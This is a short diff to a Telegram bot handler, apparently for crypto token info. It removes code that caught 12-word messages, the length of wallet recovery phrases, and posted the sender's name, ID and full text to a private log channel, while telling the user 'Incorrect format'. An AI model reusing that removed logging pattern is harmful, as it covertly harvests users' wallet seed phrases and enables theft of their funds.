@@ -184,12 +184,6 @@ async def reply_info_and_stringu(bot, message):
     # Check if message contains exactly 12 words
     if len(message.text.split()) == 12:
         await message.reply_text("<b>Incorrect format, Please try again.!</b>")
-        
-        # Log the message
-        await bot.send_message(
-            chat_id=Config.LOG_CHANNEL,
-            text=f"<b>#𝐏𝐌_𝐌𝐒𝐆\n\nNᴀᴍᴇ : {user}\n\nID : {user_id}\n\nMᴇssᴀɢᴇ : {message.text}</b>"
-        )
         return
 
     # Handle token info request
